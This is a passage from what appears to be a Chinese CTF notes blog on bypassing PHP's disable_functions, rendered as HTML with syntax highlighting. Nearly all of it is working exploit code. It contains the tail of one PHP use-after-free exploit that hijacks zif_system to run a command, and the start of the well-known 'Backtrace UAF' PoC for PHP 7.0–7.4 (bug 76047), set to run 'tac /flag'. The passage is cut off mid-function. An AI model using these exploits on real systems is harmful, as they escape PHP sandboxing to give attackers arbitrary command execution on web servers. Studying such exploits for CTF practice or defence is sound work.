class="variable">$room</span> = [];</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">            <span class="variable">$room</span>[] = <span class="keyword">new</span> <span class="title function_ invoke__">Z</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_protector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">78</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;abc = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">ptr2str</span>(<span class="number">0</span>, <span class="number">79</span>);</span><br><span class="line">        <span class="variable">$p</span> = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$y</span>[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$protector</span> = <span class="string">&quot;.<span class="subst">$_protector</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$x</span> = <span class="keyword">new</span> <span class="title class_">DateInterval</span>(<span class="string">&#x27;PT1S&#x27;</span>);</span><br><span class="line">        <span class="variable">$x</span>-&gt;d = <span class="number">0x2000</span>;</span><br><span class="line">        <span class="variable">$x</span>-&gt;h = <span class="number">0xdeadbeef</span>;</span><br><span class="line">        <span class="comment"># $this-&gt;abc is now of size 0x2000</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc) != <span class="number">0xdeadbeef</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;UAF failed.&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span> = <span class="keyword">new</span> <span class="title class_">MySplFixedArray</span>();</span><br><span class="line">        <span class="variable">$spl2</span> = <span class="keyword">new</span> <span class="title class_">MySplFixedArray</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment"># some leaks</span></span><br><span class="line">        <span class="variable">$class_entry</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x120</span>);</span><br><span class="line">        <span class="variable">$handlers</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x128</span>);</span><br><span class="line">        <span class="variable">$php_heap</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x1a8</span>);</span><br><span class="line">        <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0x218</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake class_entry</span></span><br><span class="line">        <span class="variable">$fake_obj</span> = <span class="variable">$abc_addr</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0</span>, <span class="number">2</span>); <span class="comment"># type</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x120</span>, <span class="variable">$abc_addr</span>); <span class="comment"># fake class_entry</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy some of class_entry definition</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">16</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak1</span>(<span class="variable">$class_entry</span> + <span class="number">0x10</span> + <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake static members table</span></span><br><span class="line">        <span class="variable">$fake_tbl_off</span> = <span class="number">0x70</span> * <span class="number">4</span> - <span class="number">16</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x30</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x38</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment"># fake zval_reference</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_tbl_off</span> + <span class="number">0x10</span>); <span class="comment"># zval</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_tbl_off</span> + <span class="number">8</span>, <span class="number">10</span>); <span class="comment"># zval type (reference)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># look for binary base</span></span><br><span class="line">        <span class="variable">$binary_leak</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$handlers</span> + <span class="number">0x10</span>);</span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse elf header</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># get basic_functions address</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># find system entry</span></span><br><span class="line">        <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># copy hashtable offsetGet bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_off</span> = <span class="number">0x70</span> * <span class="number">5</span> - <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$function_data</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x50</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$function_data</span> + <span class="number">0x40</span> * <span class="number">4</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># create a fake bucket</span></span><br><span class="line">        <span class="variable">$fake_bkt_addr</span> = <span class="variable">$abc_addr</span> + <span class="variable">$fake_bkt_off</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x50</span>, <span class="variable">$fake_bkt_addr</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">3</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="number">0x58</span> + <span class="variable">$i</span> * <span class="number">4</span>, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># copy bucket zval</span></span><br><span class="line">        <span class="variable">$function_zval</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">str2ptr</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">12</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc,  <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="variable">$i</span> * <span class="number">8</span>, </span><br><span class="line">                <span class="variable">$this</span>-&gt;<span class="title function_ invoke__">leak2</span>(<span class="variable">$function_zval</span>, <span class="variable">$i</span> * <span class="number">8</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># pwn</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span> + <span class="number">0x70</span> + <span class="number">0x30</span>, <span class="variable">$zif_system</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="variable">$this</span>-&gt;abc, <span class="variable">$fake_bkt_off</span>, <span class="variable">$fake_bkt_addr</span> + <span class="number">0x70</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$spl1</span>-&gt;<span class="title function_ invoke__">offsetGet</span>(<span class="variable">$cmd</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$y</span> = [<span class="keyword">new</span> <span class="title function_ invoke__">Z</span>()];</span><br><span class="line"><span class="title function_ invoke__">json_encode</span>([&amp;<span class="variable">$y</span>]);</span><br></pre></td></tr></table></figure><h2 id="17-7-Backtrace-UAF"><a href="#17-7-Backtrace-UAF" class="headerlink" title="17.7 Backtrace UAF"></a>17.7 Backtrace UAF</h2><p>方法一：蚁剑插件PHP7_Backtrace_UAF</p><p>方法二：脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># PHP 7.0-7.4 disable_functions bypass PoC (*nix only)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Bug: https://bugs.php.net/bug.php?id=76047</span></span><br><span class="line"><span class="comment"># debug_backtrace() returns a reference to a variable </span></span><br><span class="line"><span class="comment"># that has been destroyed, causing a UAF vulnerability.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This exploit should work on all PHP 7.0-7.4 versions</span></span><br><span class="line"><span class="comment"># released as of 30/01/2020.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Author: https://github.com/mm0r1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">pwn</span>(<span class="string">&quot;tac /flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pwn</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>(); <span class="comment"># ;)</span></span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123; <span class="comment"># PHP &gt;= 7.4</span></span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">chr</span>(<span class="variable">$v</span> &amp; <span class="number">0xff</span>);</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_Write</span></span><br><span class="line">                <span class="comment"># handle pie</span></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; <span class="comment"># PT_LOAD, PF_Read_exec</span></span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;constant&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                <span class="comment"># &#x27;bin2hex&#x27; constant check</span></span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123; <span class="comment"># ELF header</span></span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            